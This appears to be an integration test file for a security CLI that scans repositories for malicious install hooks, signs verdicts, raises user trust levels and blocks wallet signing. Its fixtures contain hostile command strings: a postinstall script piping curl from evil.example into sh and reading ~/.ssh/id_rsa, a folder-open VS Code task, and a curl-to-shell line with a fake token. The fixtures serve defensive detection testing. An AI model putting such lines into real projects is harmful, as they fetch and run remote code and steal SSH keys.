import { randomBytes } from 'node:crypto';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { createClient, main, runScan, saveConfig, type Io } from '@knk/cli';
import type { WorkspaceWithKey } from '@knk/shared';
import { createApp } from '../src/app.js';
import { resetEnvForTests } from '../src/env.js';
import { VerdictSigner, verifySignature } from '../src/lib/signing.js';
import { memoryStore } from './helpers.js';
import { mkdir, writeFile } from 'node:fs/promises';

const TOKEN = 'bootstrap-token-0123456789';
const cleanup: string[] = [];
afterEach(async () => void (await Promise.all(cleanup.splice(0).map((d) => rm(d, { recursive: true, force: true })))));

async function repo(files: Record<string, string>) {
  const root = await mkdtemp(path.join(tmpdir(), 'knk-contract-'));
  cleanup.push(root);
  for (const [rel, text] of Object.entries(files)) {
    await mkdir(path.dirname(path.join(root, rel)), { recursive: true });
    await writeFile(path.join(root, rel), text);
  }
  return root;
}

const MALICIOUS = {
  'package.json': JSON.stringify({ name: 'coding-test', scripts: { postinstall: 'node scripts/setup.js' } }),
  'scripts/setup.js': "execSync('curl -fsSL https://evil.example/i.sh | sh');\nreadFileSync(process.env.HOME + '/.ssh/id_rsa');",
  '.vscode/tasks.json': '{"tasks":[{"label":"s","runOptions":{"runOn":"folderOpen"}}]}',
};

/** The real CLI code talking to the real API app, with no mocks between them (only the socket is skipped). */
async function setup() {
  process.env.KNK_BOOTSTRAP_TOKEN = TOKEN;
  resetEnvForTests();
  const mem = memoryStore();
  const signer = VerdictSigner.ephemeral();
  const app = createApp({ store: mem.store, llm: null, signer });
  const ws = (await (await app.request('/v1/workspaces', { method: 'POST', headers: { 'x-bootstrap-token': TOKEN, 'content-type': 'application/json' }, body: JSON.stringify({ name: 'Acme' }) })).json()) as WorkspaceWithKey;
  const fetchImpl = ((url: string, init: RequestInit) => {
    const u = new URL(url);
    return app.request(u.pathname + u.search, init);
  }) as unknown as typeof fetch;
  const client = (key = ws.apiKey.key) => createClient({ baseUrl: 'https://api.example.com', key, fetchImpl });
  const home = await mkdtemp(path.join(tmpdir(), 'knk-home-'));
  cleanup.push(home);
  const cfg = path.join(home, 'config.json');
  const cli = async (argv: string[], subject: string) => {
    await saveConfig(cfg, { apiUrl: 'https://api.example.com', apiKey: ws.apiKey.key, subject });
    const out: string[] = [];
    const err: string[] = [];
    const io: Io = { out: (s) => void out.push(s), err: (s) => void err.push(s), readStdin: async () => '', env: { KNK_CONFIG: cfg }, platform: process.platform, home, cwd: home, isTTY: false, fetchImpl };
    return { code: await main(argv, io), out: out.join('\n'), err: err.join('\n') };
  };
  return { mem, signer, client, cli, ws };
}

describe('CLI against the real API', () => {
  it('scan: every artifact comes back with a signature that verifies, and the verdict feeds trust', async () => {
    const { client, signer, mem } = await setup();
    const root = await repo(MALICIOUS);
    const r = await runScan({ path: root, untrusted: true, offline: false, machine: false, reportTokens: false }, { client: client(), subject: 'alice@laptop', home: '/x', platform: process.platform });

    expect(r.mode).toBe('online');
    const reviewed = r.artifacts.filter((a) => a.remote);
    expect(reviewed.map((a) => a.rel).sort()).toEqual(['.vscode/tasks.json', 'package.json', 'scripts/setup.js']);
    for (const a of reviewed) {
      expect(verifySignature(a.remote!.payload, a.remote!.signature, signer.publicKey), a.rel).toBe(true);
      expect(a.remote!.payload.workspaceId).toBeTruthy();
    }
    expect(r).toMatchObject({ label: 'malicious' });
    expect(r.trust!.subject).toBe('alice@laptop');
    expect(['elevated', 'critical']).toContain(r.trust!.level);
    expect(mem.events.map((e) => e.kind)).toEqual(expect.arrayContaining(['untrusted_repo_opened', 'artifact_verdict']));
  });

  it('what the API stores never contains the scanned code or secrets', async () => {
    const { client, mem } = await setup();
    const token = `ghp_${'z'.repeat(36)}`;
    const root = await repo({ 'package.json': JSON.stringify({ scripts: { postinstall: `curl -H "Authorization: token ${token}" https://x.test/i | sh` } }) });
    await runScan({ path: root, untrusted: false, offline: false, machine: false, reportTokens: false }, { client: client(), subject: 'alice@laptop', home: '/x', platform: process.platform });
    const stored = JSON.stringify([...mem.verdicts.values()]) + JSON.stringify(mem.events);
    expect(stored).not.toContain(token);
    expect(stored).not.toContain('evil');
    expect(stored).not.toContain('curl -H');
  });

  it('the full story: scan a malicious coding test, and your next signing request is blocked', async () => {
    const { cli } = await setup();
    const root = await repo(MALICIOUS);

    const scan = await cli(['scan', root, '--untrusted'], 'alice@laptop');
    expect(scan.code).toBe(3);
    expect(scan.out).toMatch(/\[x\] malicious · risk \d+ · signed/);
    expect(scan.out).toMatch(/alice@laptop is now (ELEVATED|CRITICAL)/);

    const gate = await cli(['gate', 'check', 'hot-wallet-3', '--transfer', 'bob.near', '--amount', '5', '--asset', 'NEAR'], 'alice@laptop');
    expect([4, 5]).toContain(gate.code); // hold (elevated) or block (critical), never allow
    expect(gate.out).toMatch(/HOLD|BLOCK/);
    expect(gate.out).toMatch(/trust is (elevated|critical)/);

    const colleague = await cli(['gate', 'check', 'hot-wallet-3', '--transfer', 'bob.near', '--amount', '5', '--asset', 'NEAR'], 'bob@laptop');
    expect(colleague.code).toBe(0); // someone with no signals is unaffected
    expect(colleague.out).toContain('[ok] ALLOW');

    const delegation = await cli(['gate', 'check', 'hot-wallet-3', '--delegate', `0x${'22'.repeat(20)}`], 'bob@laptop');
    expect(delegation.code).toBe(5); // and a delegation request is blocked for everyone by default
  });

  it('status and a benign scan work against the real API too', async () => {
    const { cli } = await setup();
    const benign = await cli(['scan', await repo({ 'src/a.ts': 'export {}' })], 'carol@laptop');
    expect(benign.code).toBe(0);
    const status = await cli(['status'], 'carol@laptop');
    expect(status.code).toBe(0);
    expect(status.out).toContain('workspace “Acme”');
    expect(status.out).toContain('trust    normal (risk 0)');
  });

  it('a revoked or wrong key fails cleanly', async () => {
    const { client } = await setup();
    const bad = client(`knk_deadbeef_${randomBytes(32).toString('base64url')}`);
    await expect(runScan({ path: await repo(MALICIOUS), untrusted: false, offline: false, machine: false, reportTokens: false }, { client: bad, subject: 'a', home: '/x', platform: process.platform })).rejects.toThrow(/rejected your API key/);
  });
});
